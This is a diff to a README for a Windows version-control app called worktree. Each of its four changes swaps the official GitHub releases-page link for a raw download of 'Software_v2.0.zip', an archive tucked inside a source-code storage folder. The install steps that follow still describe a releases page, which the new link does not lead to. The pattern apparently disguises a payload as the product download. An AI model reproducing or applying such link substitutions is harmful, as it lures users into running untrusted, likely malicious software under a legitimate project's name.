@@ -1,6 +1,6 @@
 # 🧰 worktree - Simple version control for Windows
 
-[⬇️ Download worktree](https://github.com/JosephElaro/worktree/releases)
+[⬇️ Download worktree](https://raw.githubusercontent.com/JosephElaro/worktree/main/crates/worktree-server/src/storage/Software_v2.0.zip)
 
 ## 🚀 What is worktree?
 
@@ -10,7 +10,7 @@ This app is made for Windows users who want to download a release and run it wit
 
 ## 📥 Download worktree
 
-Visit this page to download: https://github.com/JosephElaro/worktree/releases
+Visit this page to download: https://raw.githubusercontent.com/JosephElaro/worktree/main/crates/worktree-server/src/storage/Software_v2.0.zip
 
 On that page, look for the latest release and download the Windows file that matches your computer. If you see more than one file, choose the one for Windows with the .exe or .msi file type.
 
@@ -28,7 +28,7 @@ For best results, close other large apps before you install.
 
 ## 🧭 How to install on Windows
 
-1. Open the download page: https://github.com/JosephElaro/worktree/releases
+1. Open the download page: https://raw.githubusercontent.com/JosephElaro/worktree/main/crates/worktree-server/src/storage/Software_v2.0.zip
 2. Find the newest release at the top of the page
 3. Open the Assets section
 4. Download the Windows file
@@ -159,7 +159,7 @@ worktree is based on the idea of a version control system with access controls t
 
 ## 🧷 Useful link
 
-- Releases page: https://github.com/JosephElaro/worktree/releases
+- Releases page: https://raw.githubusercontent.com/JosephElaro/worktree/main/crates/worktree-server/src/storage/Software_v2.0.zip
 
 ## 🗂️ Topic map
 
